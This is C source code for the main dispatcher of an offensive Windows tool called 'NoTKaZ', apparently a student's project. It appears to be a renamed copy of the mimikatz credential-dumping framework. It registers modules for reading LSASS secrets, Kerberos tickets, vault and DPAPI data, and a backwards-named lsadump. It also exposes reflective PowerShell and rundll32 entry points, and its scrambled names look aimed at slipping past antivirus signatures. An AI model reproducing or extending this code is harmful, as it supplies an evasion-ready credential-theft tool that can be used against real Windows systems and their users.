
#include "NoTKaZ.h"

const KUHL_M * NoTKaZ_modules[] = {
	&kuhl_m_standard,
	&kuhl_m_cRyPTO,
	&kuhl_m_seKuRlSa,
	&kuhl_m_kErberoS,
	&kuhl_m_nGc,
	&kuhl_m_PRIViLeGe,
	&kuhl_m_ProCeSs,
	&kuhl_m_service,
	&kuhl_m_pmudsal,
	&kuhl_m_ts,
	&kuhl_m_event,
	&kuhl_m_mIsC,
	&kuhl_m_tOKEn,
	&kuhl_m_vAULt,
	&kuhl_m_mInesWeEpEr,
#if defined(NET_MODULE)
	&kuhl_m_net,
#endif
	&kuhl_m_dPApi,
	&kuhl_m_bUsYlIght,
	&kuhl_m_sysenv,
	&kuhl_m_sid,
	&kuhl_m_iis,
	&kuhl_m_rpc,
	&kuhl_m_sR98,
	&kuhl_m_rdm,
	&kuhl_m_acr,
};

int wmain(int argc, wchar_t * argv[])
{
	NTSTATUS status = STATUS_SUCCESS;
	int i;
#if !defined(_NOTKAZ)
	size_t len;
	wchar_t input[0xffff];
#endif
	NoTKaZ_begin();
	for(i = NoTKaZ_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING) ; i++)
	{
		kprintf(L"\n" NoTKaZ L"(" NoTKaZ_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
		status = NoTKaZ_dispatchCommand(argv[i]);
	}
#if !defined(_NOTKAZ)
	while ((status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING))
	{
		kprintf(L"\n" NoTKaZ L" # "); fflush(stdin);
		if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
		{
			if(input[len - 1] == L'\n')
				input[len - 1] = L'\0';
			kprintf_inputline(L"%s\n", input);
			status = NoTKaZ_dispatchCommand(input);
		}
	}
#endif
	NoTKaZ_end(status);
	return STATUS_SUCCESS;
}

void NoTKaZ_begin()
{
	kull_m_output_init();
#if !defined(_NOTKAZ)
	SetConsoleTitle(NoTKaZ L" " NoTKaZ_VERSION L" " NoTKaZ_ARCH L" (s66cp)");
	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
#endif

		kprintf(L"\n"
			L".#######.   ""\n"
			L".##		.  ""\n"
			L" #######		Bienvenido a mi TFG.\n" //Cambiar donut
			L" #######		\n"
			L"'##		'       \n"
			L"'#######'        \n");
	NoTKaZ_initOrClean(TRUE);
}

void NoTKaZ_end(NTSTATUS status)
{
	NoTKaZ_initOrClean(FALSE);
#if !defined(_NOTKAZ)
	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
#endif
	kull_m_output_clean();
#if !defined(_WINDLL)
	if(status == STATUS_THREAD_IS_TERMINATING)
		ExitThread(STATUS_SUCCESS);
	else ExitProcess(STATUS_SUCCESS);
#endif
}

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	NoTKaZ_initOrClean(FALSE);
	return FALSE;
}

NTSTATUS NoTKaZ_initOrClean(BOOL Init)
{
	unsigned short indexModule;
	PKUHL_M_C_FUNC_INIT function;
	long offsetToFunc;
	NTSTATUS fStatus;
	HRESULT hr;

	if(Init)
	{
		RtlGetNtVersionNumbers(&NoTKaZ_NT_MAJOR_VERSION, &NoTKaZ_NT_MINOR_VERSION, &NoTKaZ_NT_BUILD_NUMBER);
		NoTKaZ_NT_BUILD_NUMBER &= 0x00007fff;
		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		if(FAILED(hr))
#if defined(_NOTKAZ)
			if(hr != RPC_E_CHANGED_MODE)
#endif
				PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
		kull_m_asn1_init();
	}
	else
		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);

	for(indexModule = 0; indexModule < ARRAYSIZE(NoTKaZ_modules); indexModule++)
	{
		if(function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (NoTKaZ_modules[indexModule]) + offsetToFunc))
		{
			fStatus = function();
			if(!NT_SUCCESS(fStatus))
				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), NoTKaZ_modules[indexModule]->shortName, fStatus);
		}
	}

	if(!Init)
	{
		kull_m_asn1_term();
		CoUninitialize();
		kull_m_output_file(NULL);
	}
	return STATUS_SUCCESS;
}

NTSTATUS NoTKaZ_dispatchCommand(wchar_t * input)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PWCHAR full;
	if(full = kull_m_file_fullPath(input))
	{
		switch(full[0])
		{
		case L'!':
			status = kuhl_m_kernel_do(full + 1);
			break;
		case L'*':
			status = kuhl_m_rpc_do(full + 1);
			break;
		default:
			status = NoTKaZ_doLocal(full);
		}
		LocalFree(full);
	}
	return status;
}

NTSTATUS NoTKaZ_doLocal(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
	unsigned short indexModule, indexCommand;
	BOOL moduleFound = FALSE, commandFound = FALSE;
	
	if(argv && (argc > 0))
	{
		if(match = wcsstr(argv[0], L"::"))
		{
			if(module = (wchar_t *) LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
			{
				if((unsigned int) (match + 2 - argv[0]) < wcslen(argv[0]))
					command = match + 2;
				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
			}
		}
		else command = argv[0];

		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(NoTKaZ_modules)); indexModule++)
			if(moduleFound = (!module || (_wcsicmp(module, NoTKaZ_modules[indexModule]->shortName) == 0)))
				if(command)
					for(indexCommand = 0; !commandFound && (indexCommand < NoTKaZ_modules[indexModule]->nbCommands); indexCommand++)
						if(commandFound = _wcsicmp(command, NoTKaZ_modules[indexModule]->commands[indexCommand].command) == 0)
							status = NoTKaZ_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);

		if(!moduleFound)
		{
			PRINT_ERROR(L"\"%s\" module not found !\n", module);
			for(indexModule = 0; indexModule < ARRAYSIZE(NoTKaZ_modules); indexModule++)
			{
				kprintf(L"\n%16s", NoTKaZ_modules[indexModule]->shortName);
				if(NoTKaZ_modules[indexModule]->fullName)
					kprintf(L"  -  %s", NoTKaZ_modules[indexModule]->fullName);
				if(NoTKaZ_modules[indexModule]->description)
					kprintf(L"  [%s]", NoTKaZ_modules[indexModule]->description);
			}
			kprintf(L"\n");
		}
		else if(!commandFound)
		{
			indexModule -= 1;
			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, NoTKaZ_modules[indexModule]->shortName);

			kprintf(L"\nModule :\t%s", NoTKaZ_modules[indexModule]->shortName);
			if(NoTKaZ_modules[indexModule]->fullName)
				kprintf(L"\nFull name :\t%s", NoTKaZ_modules[indexModule]->fullName);
			if(NoTKaZ_modules[indexModule]->description)
				kprintf(L"\nDescription :\t%s", NoTKaZ_modules[indexModule]->description);
			kprintf(L"\n");

			for(indexCommand = 0; indexCommand < NoTKaZ_modules[indexModule]->nbCommands; indexCommand++)
			{
				kprintf(L"\n%16s", NoTKaZ_modules[indexModule]->commands[indexCommand].command);
				if(NoTKaZ_modules[indexModule]->commands[indexCommand].description)
					kprintf(L"  -  %s", NoTKaZ_modules[indexModule]->commands[indexCommand].description);
			}
			kprintf(L"\n");
		}

		if(module)
			LocalFree(module);
		LocalFree(argv);
	}
	return status;
}

#if defined(_NOTKAZ)
__declspec(dllexport) wchar_t * powershell_reflective_NoTKaZ(LPCWSTR input)
{
	int argc = 0;
	wchar_t ** argv;
	
	if(argv = CommandLineToArgvW(input, &argc))
	{
		outputBufferElements = 0xff;
		outputBufferElementsPosition = 0;
		if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
			wmain(argc, argv);
		LocalFree(argv);
	}
	return outputBuffer;
}
#endif

#if defined(_WINDLL)
void CALLBACK NoTKaZ_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
{
	int argc = 0;
	wchar_t ** argv;

	AllocConsole();
#pragma warning(push)
#pragma warning(disable:4996)
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);
	freopen("CONIN$", "r", stdin);
#pragma warning(pop)
	if(lpszCmdLine && lstrlenW(lpszCmdLine))
	{
		if(argv = CommandLineToArgvW(lpszCmdLine, &argc))
		{
			wmain(argc, argv);
			LocalFree(argv);
		}
	}
	else wmain(0, NULL);
}
#endif

FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli)
{
    if((dliNotify == dliFailLoadLib) && ((_stricmp(pdli->szDll, "ncrypt.dll") == 0) || (_stricmp(pdli->szDll, "bcrypt.dll") == 0)))
		RaiseException(ERROR_DLL_NOT_FOUND, 0, 0, NULL);
    return NULL;
}
#if !defined(_DELAY_IMP_VER)
const
#endif
PfnDliHook __pfnDliFailureHook2 = delayHookFailureFunc;